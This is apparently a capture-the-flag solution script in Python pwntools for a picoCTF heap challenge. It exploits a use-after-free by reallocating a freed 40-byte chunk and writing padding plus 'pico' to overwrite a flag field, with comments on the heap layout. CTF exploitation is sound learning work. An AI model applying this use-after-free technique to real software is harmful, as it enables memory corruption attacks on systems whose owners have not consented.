#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("tethys.picoctf.net", 54118)
    else:
        return process(elf.path)

io = start()

io.sendlineafter(b"Enter your choice: ", b"5")

io.sendlineafter(b"Enter your choice: ", b"2")

# The x struct takes up 40 bytes and resides in a 0x30 category tcache after being freed.
# For this reason we have to allocate a chunk of the same size to get the one that x is 
# pointing to

io.sendlineafter(b"Size of object allocation: ", b"40")

# To reach the flag field of x we have to write 30 bytes of garbage to cover the 3 char arrays a, b and c
# of size 10. This also makes sense since there a 3 blank quadwords (8 byte each) and then 6 clear bytes up
# to the "pico" value on the heap.
io.sendlineafter(B"Data for flag: ", b"A"*30 + b"pico")

# Check win
io.sendlineafter(b"Enter your choice: ", b"4")

io.interactive()
